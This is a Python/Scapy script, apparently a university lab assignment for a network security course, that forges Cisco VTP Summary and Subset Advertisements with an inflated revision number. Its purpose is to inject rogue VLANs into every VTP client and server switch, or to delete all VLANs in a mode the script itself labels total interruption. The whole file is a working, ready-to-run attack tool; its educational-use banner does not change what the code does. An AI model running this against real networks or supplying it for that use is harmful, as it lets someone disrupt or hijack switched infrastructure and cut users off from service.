#!/usr/bin/env python3
"""
=============================================================================
 VTP ATTACK SCRIPT - Agregar y Borrar VLANs mediante VTP Spoofing
=============================================================================
 Autor       : Diego Marte | Matricula: 2023-0316
 Asignatura  : Seguridad de Redes | ITLA
 Descripcion : Construye tramas VTP (Summary + Subset Advertisement) con
               numero de revision mayor al dominio objetivo. Todos los
               switches que sean VTP Client o Server aceptaran la nueva
               base de datos de VLANs, permitiendo agregar o borrar VLANs
               en toda la red de forma remota.
 Requisitos  : Python 3.x, Scapy, interfaz en modo TRUNK con el switch
=============================================================================
 Topologia:
   Internet
       |
   Router (Fa0/0: 20.23.3.1)
       |
   SW-L2 [Gig0/0: router | Gig0/1: Kali 20.23.3.16 | Gig0/2: Victima | Gig0/3: SW-CORE]
       |
   SW-CORE (VTP Server, 20.23.3.2)
       |--- SW-ACC-1 (VTP Client, 20.23.3.3)
       |--- SW-ACC-2 (VTP Client, 20.23.3.4)
=============================================================================
"""

from scapy.all import *
import struct
import argparse
import sys
import time
import os

DOMINIO_VTP      = "LAB-2023-0316"
REVISION_ALTA    = 127
INTERFAZ_DEFAULT = "eth0"
VTP_MULTICAST    = "01:00:0c:cc:cc:cc"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""
{CYAN}{BOLD}
+----------------------------------------------------------+
|          VTP ATTACK TOOL - Seguridad de Redes            |
|          Diego Marte | Matricula: 2023-0316 | ITLA       |
|          Solo para uso educativo en lab controlado       |
+----------------------------------------------------------+
{RESET}""")

def construir_encabezado_snap():
    """
    Encabezado LLC/SNAP para tramas VTP.
    DSAP=0xAA, SSAP=0xAA, Ctrl=0x03, OUI=00000C, PID=2003
    """
    return b'\xaa\xaa\x03\x00\x00\x0c\x20\x03'

def construir_vtp_summary(dominio: str, revision: int) -> bytes:
    dominio_bytes = dominio.encode('ascii')[:32].ljust(32, b'\x00')
    payload = b''
    payload += b'\x01'
    payload += b'\x01'
    payload += b'\x00'
    payload += bytes([len(dominio.encode('ascii'))])
    payload += dominio_bytes
    payload += struct.pack('>I', int(time.time()))
    payload += struct.pack('>I', revision)
    payload += b'\x00' * 16
    return payload

def construir_vtp_subset(dominio: str, revision: int, vlans: list) -> bytes:
    dominio_bytes = dominio.encode('ascii')[:32].ljust(32, b'\x00')
    payload = b''
    payload += b'\x01'
    payload += b'\x02'
    payload += b'\x01'
    payload += bytes([len(dominio.encode('ascii'))])
    payload += dominio_bytes
    payload += struct.pack('>I', revision)
    for vlan_id, nombre in vlans:
        nombre_bytes = nombre.encode('ascii')[:32]
        longitud_info = 12 + len(nombre_bytes)
        payload += bytes([longitud_info])
        payload += b'\xa0'
        payload += b'\x00'
        payload += bytes([len(nombre_bytes)])
        payload += struct.pack('>H', vlan_id)
        payload += b'\x00\x64'
        payload += b'\x00\x00\x00\x00'
        payload += nombre_bytes
    return payload

def enviar_vtp(interfaz: str, dominio: str, revision: int, vlans: list):
    mac_src = get_if_hwaddr(interfaz)
    snap    = construir_encabezado_snap()
    summary_payload = snap + construir_vtp_summary(dominio, revision)
    pkt_summary = (Ether(src=mac_src, dst=VTP_MULTICAST) / Raw(load=summary_payload))
    subset_payload = snap + construir_vtp_subset(dominio, revision, vlans)
    pkt_subset = (Ether(src=mac_src, dst=VTP_MULTICAST) / Raw(load=subset_payload))
    print(f"\n{YELLOW}[*] Enviando VTP Summary Advertisement...{RESET}")
    sendp(pkt_summary, iface=interfaz, verbose=False)
    time.sleep(0.5)
    print(f"{YELLOW}[*] Enviando VTP Subset Advertisement ({len(vlans)} VLANs)...{RESET}")
    sendp(pkt_subset, iface=interfaz, verbose=False)

def main():
    banner()
    parser = argparse.ArgumentParser(description='VTP Attack Tool - Matricula: 2023-0316', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interfaz', default=INTERFAZ_DEFAULT, help=f'Interfaz de red (default: {INTERFAZ_DEFAULT})')
    parser.add_argument('-d', '--dominio', default=DOMINIO_VTP, help=f'Dominio VTP objetivo (default: {DOMINIO_VTP})')
    parser.add_argument('-r', '--revision', type=int, default=REVISION_ALTA, help=f'Numero de revision (default: {REVISION_ALTA})')
    parser.add_argument('-a', '--accion', required=True, choices=['agregar', 'borrar'], help='agregar: inyecta VLANs  |  borrar: elimina todas las VLANs')
    parser.add_argument('--vlans', nargs='+', default=['100:VLAN-ATAQUE'], metavar='ID:NOMBRE', help='VLANs a inyectar en formato ID:NOMBRE')
    args = parser.parse_args()
    if os.geteuid() != 0:
        print(f"{RED}[!] Este script requiere privilegios de root (sudo){RESET}")
        sys.exit(1)
    print(f"{CYAN}[*] Interfaz : {args.interfaz}{RESET}")
    print(f"{CYAN}[*] Dominio  : {args.dominio}{RESET}")
    print(f"{CYAN}[*] Revision : {args.revision}{RESET}")
    print(f"{CYAN}[*] Accion   : {args.accion.upper()}{RESET}")
    if args.accion == 'borrar':
        print(f"\n{RED}[!] MODO BORRAR: Subset vacio -> INTERRUPCION TOTAL{RESET}")
        vlans = []
    else:
        vlans = []
        for entrada in args.vlans:
            partes = entrada.split(':')
            if len(partes) != 2:
                print(f"{RED}[!] Formato invalido: {entrada}  (use ID:NOMBRE){RESET}")
                sys.exit(1)
            vlans.append((int(partes[0]), partes[1]))
            print(f"  {GREEN}[+] VLAN {partes[0]}: {partes[1]}{RESET}")
    print()
    enviar_vtp(args.interfaz, args.dominio, args.revision, vlans)
    if args.accion == 'agregar':
        print(f"\n{GREEN}[+] VLANs inyectadas. Verificar: show vlan brief{RESET}")
    else:
        print(f"\n{RED}[+] VLANs borradas. Verificar: show vlan brief{RESET}")

if __name__ == '__main__':
    main()
